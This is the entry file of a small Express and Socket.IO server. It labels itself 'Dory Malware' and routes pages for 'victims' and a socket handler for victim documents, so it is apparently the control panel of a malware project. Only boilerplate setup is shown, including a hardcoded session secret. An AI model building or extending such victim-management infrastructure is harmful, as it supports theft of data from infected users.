const express = require("express");
const hbs = require('hbs');
const session = require("express-session");

const app = express();
const server = require("http").Server(app);
const io = require("socket.io")(server);


app.use(express.json());
app.use(express.urlencoded({extended: false}));

const port = process.env.PORT || 1010;

//Sessiones
app.use(session({
    secret: "Roxanna",
    resave: false,
    saveUninitialized: true
}))
//Sessiones

//Motor de plantillas
hbs.registerPartials('./views/partials',);
app.set('view engine', 'hbs');
app.set("views", __dirname + "/views");
//Motor de plantillas

//Sockets
require("./sockets/victim/documents")(io)
//Sockets

//Carpeta publica
app.use(express.static("./public"));
//Carpeta publica

//Rutas
app.use("/", require("./router/index/index")); //Router raiz
app.use("/victims", require("./router/victims/index")); //Router victims
app.use("/victim", require("./router/victim/index")); //Router victim
app.use("/api", require("./router/api/index")); //Router api
//Rutas


server.listen(port, () =>{
    console.log("Dory Malware => http://localhost:"+port);
});